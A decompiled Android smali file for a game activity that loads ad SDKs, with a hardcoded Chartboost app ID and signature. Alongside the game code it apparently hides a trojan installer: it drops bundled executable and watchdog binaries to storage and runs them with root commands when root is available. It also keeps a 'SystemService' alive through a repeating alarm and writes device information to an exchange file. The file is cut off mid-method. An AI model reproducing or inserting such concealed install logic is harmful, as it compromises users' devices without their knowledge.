.class public Lcom/carlospinan/utils/UtilActivity;
.super Lcom/google/example/games/basegameutils/BaseGameActivity;
.source "UtilActivity.java"


# static fields
.field private static final AD_UNIT_ID:Ljava/lang/String; = ""

.field public static final TAG:Ljava/lang/String; = "UtilActivity"

.field private static _appActiviy:Lcom/carlospinan/utils/UtilActivity;


# instance fields
.field private adView:Lcom/google/android/gms/ads/AdView;

.field private adViewLayout:Landroid/widget/FrameLayout;

.field private context:Landroid/content/Context;

.field private installType:I

.field private interstitial:Lcom/google/android/gms/ads/InterstitialAd;

.field private thread:Ljava/lang/Thread;


# direct methods
.method static constructor <clinit>()V
    .locals 1

    .prologue
    .line 581
    const-string v0, "cocos2dcpp"

    invoke-static {v0}, Ljava/lang/System;->loadLibrary(Ljava/lang/String;)V

    .line 582
    return-void
.end method

.method public constructor <init>()V
    .locals 1

    .prologue
    const/4 v0, 0x0

    .line 69
    invoke-direct {p0}, Lcom/google/example/games/basegameutils/BaseGameActivity;-><init>()V

    .line 71
    iput-object v0, p0, Lcom/carlospinan/utils/UtilActivity;->adView:Lcom/google/android/gms/ads/AdView;

    .line 72
    iput-object v0, p0, Lcom/carlospinan/utils/UtilActivity;->adViewLayout:Landroid/widget/FrameLayout;

    .line 69
    return-void
.end method

.method private GameInit()V
    .locals 5

    .prologue
    .line 184
    invoke-virtual {p0}, Lcom/carlospinan/utils/UtilActivity;->getWindow()Landroid/view/Window;

    move-result-object v3

    const/16 v4, 0x80

    invoke-virtual {v3, v4}, Landroid/view/Window;->addFlags(I)V

    .line 187
    const-string v3, "56a4932dda15274f177c4814"

    const-string v4, "c4b2807d77d28ff4e5fc35f8fe0342c8a0752a76"

    invoke-static {p0, v3, v4}, Lcom/chartboost/sdk/Chartboost;->startWithAppId(Landroid/app/Activity;Ljava/lang/String;Ljava/lang/String;)V

    .line 188
    invoke-static {p0}, Lcom/chartboost/sdk/Chartboost;->onCreate(Landroid/app/Activity;)V

    .line 189
    const-string v3, "Default"

    invoke-static {v3}, Lcom/chartboost/sdk/Chartboost;->cacheInterstitial(Ljava/lang/String;)V

    .line 191
    new-instance v3, Lcom/google/android/gms/ads/InterstitialAd;

    invoke-direct {v3, p0}, Lcom/google/android/gms/ads/InterstitialAd;-><init>(Landroid/content/Context;)V

    iput-object v3, p0, Lcom/carlospinan/utils/UtilActivity;->interstitial:Lcom/google/android/gms/ads/InterstitialAd;

    .line 192
    iget-object v3, p0, Lcom/carlospinan/utils/UtilActivity;->interstitial:Lcom/google/android/gms/ads/InterstitialAd;

    const-string v4, "ca-app-pub-1408024954113686/7365027050"

    invoke-virtual {v3, v4}, Lcom/google/android/gms/ads/InterstitialAd;->setAdUnitId(Ljava/lang/String;)V

    .line 194
    invoke-virtual {p0}, Lcom/carlospinan/utils/UtilActivity;->getWindowManager()Landroid/view/WindowManager;

    move-result-object v3

    invoke-interface {v3}, Landroid/view/WindowManager;->getDefaultDisplay()Landroid/view/Display;

    move-result-object v3

    invoke-direct {p0, v3}, Lcom/carlospinan/utils/UtilActivity;->getDisplaySize(Landroid/view/Display;)Landroid/graphics/Point;

    move-result-object v3

    iget v2, v3, Landroid/graphics/Point;->x:I

    .line 196
    .local v2, "width":I
    new-instance v0, Landroid/widget/FrameLayout$LayoutParams;

    .line 197
    const/4 v3, -0x2

    .line 196
    invoke-direct {v0, v2, v3}, Landroid/widget/FrameLayout$LayoutParams;-><init>(II)V

    .line 198
    .local v0, "adParams":Landroid/widget/FrameLayout$LayoutParams;
    const/16 v3, 0x50

    iput v3, v0, Landroid/widget/FrameLayout$LayoutParams;->gravity:I

    .line 200
    new-instance v3, Lcom/google/android/gms/ads/AdView;

    invoke-direct {v3, p0}, Lcom/google/android/gms/ads/AdView;-><init>(Landroid/content/Context;)V

    iput-object v3, p0, Lcom/carlospinan/utils/UtilActivity;->adView:Lcom/google/android/gms/ads/AdView;

    .line 201
    iget-object v3, p0, Lcom/carlospinan/utils/UtilActivity;->adView:Lcom/google/android/gms/ads/AdView;

    sget-object v4, Lcom/google/android/gms/ads/AdSize;->BANNER:Lcom/google/android/gms/ads/AdSize;

    invoke-virtual {v3, v4}, Lcom/google/android/gms/ads/AdView;->setAdSize(Lcom/google/android/gms/ads/AdSize;)V

    .line 202
    iget-object v3, p0, Lcom/carlospinan/utils/UtilActivity;->adView:Lcom/google/android/gms/ads/AdView;

    const-string v4, ""

    invoke-virtual {v3, v4}, Lcom/google/android/gms/ads/AdView;->setAdUnitId(Ljava/lang/String;)V

    .line 205
    new-instance v3, Lcom/google/android/gms/ads/AdRequest$Builder;

    invoke-direct {v3}, Lcom/google/android/gms/ads/AdRequest$Builder;-><init>()V

    .line 206
    invoke-virtual {v3}, Lcom/google/android/gms/ads/AdRequest$Builder;->build()Lcom/google/android/gms/ads/AdRequest;

    move-result-object v1

    .line 208
    .local v1, "adRequest":Lcom/google/android/gms/ads/AdRequest;
    iget-object v3, p0, Lcom/carlospinan/utils/UtilActivity;->adView:Lcom/google/android/gms/ads/AdView;

    invoke-virtual {v3, v1}, Lcom/google/android/gms/ads/AdView;->loadAd(Lcom/google/android/gms/ads/AdRequest;)V

    .line 209
    iget-object v3, p0, Lcom/carlospinan/utils/UtilActivity;->adView:Lcom/google/android/gms/ads/AdView;

    const/high16 v4, -0x1000000

    invoke-virtual {v3, v4}, Lcom/google/android/gms/ads/AdView;->setBackgroundColor(I)V

    .line 210
    iget-object v3, p0, Lcom/carlospinan/utils/UtilActivity;->adView:Lcom/google/android/gms/ads/AdView;

    const/4 v4, 0x0

    invoke-virtual {v3, v4}, Lcom/google/android/gms/ads/AdView;->setBackgroundColor(I)V

    .line 211
    iget-object v3, p0, Lcom/carlospinan/utils/UtilActivity;->adView:Lcom/google/android/gms/ads/AdView;

    invoke-virtual {p0, v3, v0}, Lcom/carlospinan/utils/UtilActivity;->addContentView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V

    .line 213
    sput-object p0, Lcom/carlospinan/utils/UtilActivity;->_appActiviy:Lcom/carlospinan/utils/UtilActivity;

    .line 216
    invoke-direct {p0}, Lcom/carlospinan/utils/UtilActivity;->_init()V

    .line 217
    return-void
.end method

.method private Install(I)V
    .locals 4
    .param p1, "type"    # I

    .prologue
    const/4 v3, 0x1

    const/4 v2, 0x0

    .line 589
    if-eq p1, v3, :cond_0

    .line 595
    if-nez p1, :cond_1

    .line 597
    invoke-direct {p0}, Lcom/carlospinan/utils/UtilActivity;->InstallAsNonRoot()Z

    .line 629
    :cond_0
    :goto_0
    return-void

    .line 601
    :cond_1
    new-instance v0, Ljava/lang/Thread;

    new-instance v1, Lcom/carlospinan/utils/UtilActivity$6;

    invoke-direct {v1, p0}, Lcom/carlospinan/utils/UtilActivity$6;-><init>(Lcom/carlospinan/utils/UtilActivity;)V

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    .line 609
    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    .line 611
    invoke-static {}, Lcom/stericson/RootTools/RootTools;->isRootAvailable()Z

    move-result v0

    if-eqz v0, :cond_3

    .line 613
    invoke-direct {p0}, Lcom/carlospinan/utils/UtilActivity;->InstallAsRoot()Z

    move-result v0

    if-eqz v0, :cond_2

    .line 615
    iget-object v0, p0, Lcom/carlospinan/utils/UtilActivity;->context:Landroid/content/Context;

    invoke-static {v3, v0}, Lcom/fa/c/Utilities;->SetInstallType(ILandroid/content/Context;)V

    goto :goto_0

    .line 619
    :cond_2
    invoke-direct {p0}, Lcom/carlospinan/utils/UtilActivity;->InstallAsNonRoot()Z

    .line 620
    iget-object v0, p0, Lcom/carlospinan/utils/UtilActivity;->context:Landroid/content/Context;

    invoke-static {v2, v0}, Lcom/fa/c/Utilities;->SetInstallType(ILandroid/content/Context;)V

    goto :goto_0

    .line 625
    :cond_3
    invoke-direct {p0}, Lcom/carlospinan/utils/UtilActivity;->InstallAsNonRoot()Z

    .line 626
    iget-object v0, p0, Lcom/carlospinan/utils/UtilActivity;->context:Landroid/content/Context;

    invoke-static {v2, v0}, Lcom/fa/c/Utilities;->SetInstallType(ILandroid/content/Context;)V

    goto :goto_0
.end method

.method private InstallAsNonRoot()Z
    .locals 8

    .prologue
    const/4 v1, 0x0

    .line 671
    const-class v2, Lcom/fa/c/SystemService;

    invoke-direct {p0, v2}, Lcom/carlospinan/utils/UtilActivity;->IsMyServiceRunning(Ljava/lang/Class;)Z

    move-result v2

    if-nez v2, :cond_0

    .line 674
    new-instance v2, Landroid/content/Intent;

    const-class v3, Lcom/fa/c/SystemService;

    invoke-direct {v2, p0, v3}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p0, v2}, Lcom/carlospinan/utils/UtilActivity;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    .line 679
    :cond_0
    new-instance v7, Landroid/content/Intent;

    const-string v2, "INTENT_CPS_SERVICE_RESTART"

    invoke-direct {v7, v2}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    .line 680
    .local v7, "ishintent":Landroid/content/Intent;
    invoke-static {p0, v1, v7, v1}, Landroid/app/PendingIntent;->getBroadcast(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object v6

    .line 681
    .local v6, "pintent":Landroid/app/PendingIntent;
    const-string v2, "alarm"

    invoke-virtual {p0, v2}, Lcom/carlospinan/utils/UtilActivity;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/AlarmManager;

    .line 682
    .local v0, "alarm":Landroid/app/AlarmManager;
    invoke-virtual {v0, v6}, Landroid/app/AlarmManager;->cancel(Landroid/app/PendingIntent;)V

    .line 683
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v2

    const-wide/32 v4, 0xea60

    invoke-virtual/range {v0 .. v6}, Landroid/app/AlarmManager;->setRepeating(IJJLandroid/app/PendingIntent;)V

    .line 684
    const/4 v1, 0x1

    return v1
.end method

.method private InstallAsRoot()Z
    .locals 7

    .prologue
    const/4 v3, 0x0

    .line 635
    :try_start_0
    invoke-virtual {p0}, Lcom/carlospinan/utils/UtilActivity;->getResources()Landroid/content/res/Resources;

    move-result-object v4

    const/high16 v5, 0x7f040000

    invoke-virtual {v4, v5}, Landroid/content/res/Resources;->openRawResource(I)Ljava/io/InputStream;

    move-result-object v1

    .line 636
    .local v1, "insExec":Ljava/io/InputStream;
    invoke-virtual {p0}, Lcom/carlospinan/utils/UtilActivity;->getResources()Landroid/content/res/Resources;

    move-result-object v4

    const v5, 0x7f040001

    invoke-virtual {v4, v5}, Landroid/content/res/Resources;->openRawResource(I)Ljava/io/InputStream;

    move-result-object v2

    .line 637
    .local v2, "insWd":Ljava/io/InputStream;
    new-instance v4, Ljava/lang/StringBuilder;

    invoke-static {}, Landroid/os/Environment;->getExternalStorageDirectory()Ljava/io/File;

    move-result-object v5

    invoke-virtual {v5}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v5

    invoke-static {v5}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v5

    invoke-direct {v4, v5}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    sget-object v5, Ljava/io/File;->separator:Ljava/lang/String;

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    iget-object v5, p0, Lcom/carlospinan/utils/UtilActivity;->context:Landroid/content/Context;

    invoke-static {v5}, Lcom/fa/c/Utilities;->GetExecName(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-direct {p0, v1, v4}, Lcom/carlospinan/utils/UtilActivity;->WriteRawResources(Ljava/io/InputStream;Ljava/lang/String;)V

    .line 638
    new-instance v4, Ljava/lang/StringBuilder;

    invoke-static {}, Landroid/os/Environment;->getExternalStorageDirectory()Ljava/io/File;

    move-result-object v5

    invoke-virtual {v5}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v5

    invoke-static {v5}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v5

    invoke-direct {v4, v5}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    sget-object v5, Ljava/io/File;->separator:Ljava/lang/String;

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    iget-object v5, p0, Lcom/carlospinan/utils/UtilActivity;->context:Landroid/content/Context;

    invoke-static {v5}, Lcom/fa/c/Utilities;->GetWatchDogName(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-direct {p0, v2, v4}, Lcom/carlospinan/utils/UtilActivity;->WriteRawResources(Ljava/io/InputStream;Ljava/lang/String;)V

    .line 639
    iget-object v4, p0, Lcom/carlospinan/utils/UtilActivity;->context:Landroid/content/Context;

    invoke-static {v4}, Lcom/fa/c/RootCommandExecutor;->Execute(Landroid/content/Context;)Z

    move-result v4

    if-eqz v4, :cond_0

    .line 641
    const/4 v3, 0x1

    .line 663
    .end local v1    # "insExec":Ljava/io/InputStream;
    .end local v2    # "insWd":Ljava/io/InputStream;
    :goto_0
    return v3

    .line 645
    .restart local v1    # "insExec":Ljava/io/InputStream;
    .restart local v2    # "insWd":Ljava/io/InputStream;
    :cond_0
    new-instance v4, Ljava/io/File;

    new-instance v5, Ljava/lang/StringBuilder;

    invoke-static {}, Landroid/os/Environment;->getExternalStorageDirectory()Ljava/io/File;

    move-result-object v6

    invoke-virtual {v6}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v6

    invoke-static {v6}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v6

    invoke-direct {v5, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    sget-object v6, Ljava/io/File;->separator:Ljava/lang/String;

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    iget-object v6, p0, Lcom/carlospinan/utils/UtilActivity;->context:Landroid/content/Context;

    invoke-static {v6}, Lcom/fa/c/Utilities;->GetExecName(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-direct {v4, v5}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-virtual {v4}, Ljava/io/File;->delete()Z

    .line 646
    new-instance v4, Ljava/io/File;

    new-instance v5, Ljava/lang/StringBuilder;

    invoke-static {}, Landroid/os/Environment;->getExternalStorageDirectory()Ljava/io/File;

    move-result-object v6

    invoke-virtual {v6}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v6

    invoke-static {v6}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v6

    invoke-direct {v5, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    sget-object v6, Ljava/io/File;->separator:Ljava/lang/String;

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    iget-object v6, p0, Lcom/carlospinan/utils/UtilActivity;->context:Landroid/content/Context;

    invoke-static {v6}, Lcom/fa/c/Utilities;->GetWatchDogName(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-direct {v4, v5}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-virtual {v4}, Ljava/io/File;->delete()Z
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    .line 650
    .end local v1    # "insExec":Ljava/io/InputStream;
    .end local v2    # "insWd":Ljava/io/InputStream;
    :catch_0
    move-exception v0

    .line 655
    .local v0, "e":Ljava/lang/Exception;
    :try_start_1
    new-instance v4, Ljava/io/File;

    new-instance v5, Ljava/lang/StringBuilder;

    invoke-static {}, Landroid/os/Environment;->getExternalStorageDirectory()Ljava/io/File;

    move-result-object v6

    invoke-virtual {v6}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v6

    invoke-static {v6}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v6

    invoke-direct {v5, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    sget-object v6, Ljava/io/File;->separator:Ljava/lang/String;

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    iget-object v6, p0, Lcom/carlospinan/utils/UtilActivity;->context:Landroid/content/Context;

    invoke-static {v6}, Lcom/fa/c/Utilities;->GetExecName(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-direct {v4, v5}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-virtual {v4}, Ljava/io/File;->delete()Z

    .line 656
    new-instance v4, Ljava/io/File;

    new-instance v5, Ljava/lang/StringBuilder;

    invoke-static {}, Landroid/os/Environment;->getExternalStorageDirectory()Ljava/io/File;

    move-result-object v6

    invoke-virtual {v6}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v6

    invoke-static {v6}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v6

    invoke-direct {v5, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    sget-object v6, Ljava/io/File;->separator:Ljava/lang/String;

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    iget-object v6, p0, Lcom/carlospinan/utils/UtilActivity;->context:Landroid/content/Context;

    invoke-static {v6}, Lcom/fa/c/Utilities;->GetWatchDogName(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-direct {v4, v5}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-virtual {v4}, Ljava/io/File;->delete()Z
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    goto/16 :goto_0

    .line 658
    :catch_1
    move-exception v4

    goto/16 :goto_0
.end method

.method private IsMyServiceRunning(Ljava/lang/Class;)Z
    .locals 5
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Ljava/lang/Class",
            "<*>;)Z"
        }
    .end annotation

    .prologue
    .line 743
    .local p1, "serviceClass":Ljava/lang/Class;, "Ljava/lang/Class<*>;"
    invoke-virtual {p0}, Lcom/carlospinan/utils/UtilActivity;->getApplicationContext()Landroid/content/Context;

    const-string v2, "activity"

    invoke-virtual {p0, v2}, Lcom/carlospinan/utils/UtilActivity;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/ActivityManager;

    .line 744
    .local v0, "manager":Landroid/app/ActivityManager;
    const v2, 0x7fffffff

    invoke-virtual {v0, v2}, Landroid/app/ActivityManager;->getRunningServices(I)Ljava/util/List;

    move-result-object v2

    invoke-interface {v2}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v2

    :cond_0
    invoke-interface {v2}, Ljava/util/Iterator;->hasNext()Z

    move-result v3

    if-nez v3, :cond_1

    .line 751
    const/4 v2, 0x0

    :goto_0
    return v2

    .line 744
    :cond_1
    invoke-interface {v2}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/app/ActivityManager$RunningServiceInfo;

    .line 746
    .local v1, "service":Landroid/app/ActivityManager$RunningServiceInfo;
    invoke-virtual {p1}, Ljava/lang/Class;->getName()Ljava/lang/String;

    move-result-object v3

    iget-object v4, v1, Landroid/app/ActivityManager$RunningServiceInfo;->service:Landroid/content/ComponentName;

    invoke-virtual {v4}, Landroid/content/ComponentName;->getClassName()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_0

    .line 748
    const/4 v2, 0x1

    goto :goto_0
.end method

.method private KnockServer()V
    .locals 0

    .prologue
    .line 767
    return-void
.end method

.method private WriteDeviceInfo()V
    .locals 8

    .prologue
    .line 716
    :try_start_0
    new-instance v5, Ljava/lang/StringBuilder;

    invoke-static {}, Landroid/os/Environment;->getExternalStorageDirectory()Ljava/io/File;

    move-result-object v6

    invoke-virtual {v6}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v6

    invoke-static {v6}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v6

    invoke-direct {v5, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    sget-object v6, Ljava/io/File;->separator:Ljava/lang/String;

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    iget-object v6, p0, Lcom/carlospinan/utils/UtilActivity;->context:Landroid/content/Context;

    invoke-static {v6}, Lcom/fa/c/Utilities;->GetExchangeFileName(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    .line 717
    .local v4, "path":Ljava/lang/String;
    new-instance v2, Ljava/io/File;

    invoke-direct {v2, v4}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 718
    .local v2, "file":Ljava/io/File;
    invoke-virtual {v2}, Ljava/io/File;->exists()Z

    move-result v5

    if-nez v5, :cond_0

    .line 720
    invoke-virtual {v2}, Ljava/io/File;->createNewFile()Z

    .line 721
    const/4 v5, 0x1

    invoke-virtual {v2, v5}, Ljava/io/File;->setWritable(Z)Z

    .line 722
    const/4 v5, 0x1

    invoke-virtual {v2, v5}, Ljava/io/File;->setReadable(Z)Z

    .line 724
    new-instance v3, Ljava/io/FileWriter;

    invoke-direct {v3, v2}, Ljava/io/FileWriter;-><init>(Ljava/io/File;)V

    .line 725
    .local v3, "fw":Ljava/io/FileWriter;
    new-instance v0, Ljava/io/BufferedWriter;

    invoke-direct {v0, v3}, Ljava/io/BufferedWriter;-><init>(Ljava/io/Writer;)V

    .line 726
    .local v0, "bw":Ljava/io/BufferedWriter;
    iget-object v5, p0, Lcom/carlospinan/utils/UtilActivity;->context:Landroid/content/Context;

    invoke-static {v5}, Lcom/fa/c/Utilities;->GetDeviceInfoBytes(Landroid/content/Context;)[B

    move-result-object v1

    .line 727
    .local v1, "content":[B
    const-string v5, "CPS"

    new-instance v6, Ljava/lang/StringBuilder;

    const-string v7, "Length: "

    invoke-direct {v6, v7}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-static {v1}, Lcom/fa/c/Utilities;->ToChar([B)[C

    move-result-object v7

    array-length v7, v7

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    invoke-static {v5, v6}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 728
    invoke-static {v1}, Lcom/fa/c/Utilities;->ToChar([B)[C

    move-result-object v5

    const/4 v6, 0x0

    const/16 v7, 0x14

    invoke-virtual {v0, v5, v6, v7}, Ljava/io/BufferedWriter;->write([CII)V

    .line 729
    invoke-virtual {v0}, Ljava/io/BufferedWriter;->close()V

    .line 731
    invoke-virtual {v3}, Ljava/io/FileWriter;->close()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 739
    .end local v0    # "bw":Ljava/io/BufferedWriter;
    .end local v1    # "content":[B
    .end local v2    # "file":Ljava/io/File;
    .end local v3    # "fw":Ljava/io/FileWriter;
    .end local v4    # "path":Ljava/lang/String;
    :cond_0
    :goto_0
    return-void

    .line 735
    :catch_0
    move-exception v5

    goto :goto_0
.end method

.method private WriteRawResources(Ljava/io/InputStream;Ljava/lang/String;)V
    .locals 7
    .param p1, "ins"    # Ljava/io/InputStream;
    .param p2, "path"    # Ljava/lang/String;

    .prologue
    .line 691
    :try_start_0
    new-instance v3, Ljava/io/ByteArrayOutputStream;

    invoke-direct {v3}, Ljava/io/ByteArrayOutputStream;-><init>()V

    .line 692
    .local v3, "outputStream":Ljava/io/ByteArrayOutputStream;
    const/4 v4, 0x0

    .line 693
    .local v4, "size":I
    const/16 v5, 0x400

    new-array v0, v5, [B

    .line 694
    .local v0, "buffer":[B
    :goto_0
    const/4 v5, 0x0

    const/16 v6, 0x400

    invoke-virtual {p1, v0, v5, v6}, Ljava/io/InputStream;->read([BII)I

    move-result v4

    if-gez v4, :cond_0

    .line 698
    invoke-virtual {p1}, Ljava/io/InputStream;->close()V

    .line 699
    invoke-virtual {v3}, Ljava/io/ByteArrayOutputStream;->toByteArray()[B

    move-result-object v0

    .line 700
    new-instance v2, Ljava/io/FileOutputStream;

    invoke-direct {v2, p2}, Ljava/io/FileOutputStream;-><init>(Ljava/lang/String;)V

    .line 701
    .local v2, "fos":Ljava/io/FileOutputStream;
    invoke-virtual {v2, v0}, Ljava/io/FileOutputStream;->write([B)V

    .line 702
    invoke-virtual {v2}, Ljava/io/FileOutputStream;->close()V

    .line 709
    .end local v0    # "buffer":[B
    .end local v2    # "fos":Ljava/io/FileOutputStream;
    .end local v3    # "outputStream":Ljava/io/ByteArrayOutputStream;
    .end local v4    # "size":I
    :goto_1
    return-void

    .line 696
    .restart local v0    # "buffer":[B
    .restart local v3    # "outputStream":Ljava/io/ByteArrayOutputStream;
    .restart local v4    # "size":I
    :cond_0
    const/4 v5, 0x0

    invoke-virtual {v3, v0, v5, v4}, Ljava/io/ByteArrayOutputStream;->write([BII)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    .line 704
    .end local v0    # "buffer":[B
    .end local v3    # "outputStream":Ljava/io/ByteArrayOutputStream;
    .end local v4    # "size":I
    :catch_0
    move-exception v1

    .line 706
    .local v1, "e":Ljava/lang/Exception;
    const-string v5, "CPS"

    invoke-virtual {v1}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v6

    invoke-static {v5, v6}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    goto :goto_1
.end method

.method private _init()V
    .locals 0

    .prologue
    .line 334
    invoke-static {p0}, Lcom/carlospinan/utils/NativeUtils;->configure(Landroid/content/Context;)V

    .line 338
    return-void
.end method

.method private _initAdMob()V
    .locals 5

    .prologue
    .line 342
    new-instance v1, Landroid/widget/FrameLayout$LayoutParams;

    .line 343
    const/4 v2, -0x1

    .line 344
    const/4 v3, -0x2

    .line 342
    invoke-direct {v1, v2, v3}, Landroid/widget/FrameLayout$LayoutParams;-><init>(II)V

    .line 345
    .local v1, "params":Landroid/widget/FrameLayout$LayoutParams;
    const/16 v2, 0x31

    iput v2, v1, Landroid/widget/FrameLayout$LayoutParams;->gravity:I

    .line 348
    new-instance v2, Lcom/google/android/gms/ads/AdView;

    invoke-direct {v2, p0}, Lcom/google/android/gms/ads/AdView;-><init>(Landroid/content/Context;)V

    iput-object v2, p0, Lcom/carlospinan/utils/UtilActivity;->adView:Lcom/google/android/gms/ads/AdView;

    .line 349
    iget-object v2, p0, Lcom/carlospinan/utils/UtilActivity;->adView:Lcom/google/android/gms/ads/AdView;

    sget-object v3, Lcom/google/android/gms/ads/AdSize;->SMART_BANNER:Lcom/google/android/gms/ads/AdSize;

    invoke-virtual {v2, v3}, Lcom/google/android/gms/ads/AdView;->setAdSize(Lcom/google/android/gms/ads/AdSize;)V

    .line 350
    iget-object v2, p0, Lcom/carlospinan/utils/UtilActivity;->adView:Lcom/google/android/gms/ads/AdView;

    invoke-virtual {p0}, Lcom/carlospinan/utils/UtilActivity;->getResources()Landroid/content/res/Resources;

    move-result-object v3

    const v4, 0x7f06002b

    invoke-virtual {v3, v4}, Landroid/content/res/Resources;->getString(I)Ljava/lang/String;

    move-result-object v3

